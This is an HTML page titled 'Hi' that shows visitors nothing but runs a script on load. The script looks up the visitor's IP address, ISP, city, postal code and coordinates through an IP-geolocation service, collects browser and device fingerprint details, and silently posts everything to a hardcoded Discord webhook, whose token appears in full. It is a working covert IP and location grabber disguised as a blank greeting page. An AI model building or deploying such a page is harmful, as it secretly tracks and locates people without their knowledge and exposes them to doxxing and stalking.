<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Hi</title>
  <style>
    body {
      background: #111;
      color: white;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
  </style>
</head>
<body>
  <script>
    async function getVisitorInfo() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const userAgent = navigator.userAgent;
        const language = navigator.language || navigator.userLanguage;
        const platform = navigator.platform;
        const resolution = `${screen.width}x${screen.height}`;
        const memory = navigator.deviceMemory || 'N/A';
        const cpu = navigator.hardwareConcurrency || 'N/A';

        const content = `
üìç **New Visitor Logged**
üß† **Device Info**
‚Ä¢ User Agent: \`${userAgent}\`
‚Ä¢ OS Platform: ${platform}
‚Ä¢ Language: ${language}
‚Ä¢ Screen: ${resolution}
‚Ä¢ CPU Threads: ${cpu}
‚Ä¢ RAM: ${memory} GB

üåê **Network Info**
‚Ä¢ IP: \`${data.ip}\`
‚Ä¢ ISP: ${data.org}
‚Ä¢ Country: ${data.country_name} (${data.country})
‚Ä¢ Region: ${data.region}
‚Ä¢ City: ${data.city}
‚Ä¢ Postal: ${data.postal}
‚Ä¢ Timezone: ${data.timezone}

üìå **Location**
‚Ä¢ Latitude: ${data.latitude}
‚Ä¢ Longitude: ${data.longitude}
        `;

        await fetch("https://discord.com/api/webhooks/1365451163214024805/8OezJtvTg9WGDTX6vrHHr3z0eMq04t4NlVl0SUMDfhAOlg_l_Hyq4m6uDL2mEeUZwt3t", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ content })
        });

      } catch (err) {
        console.error("Failed to fetch/send visitor info:", err);
      }
    }

    getVisitorInfo();
  </script>
</body>
</html>
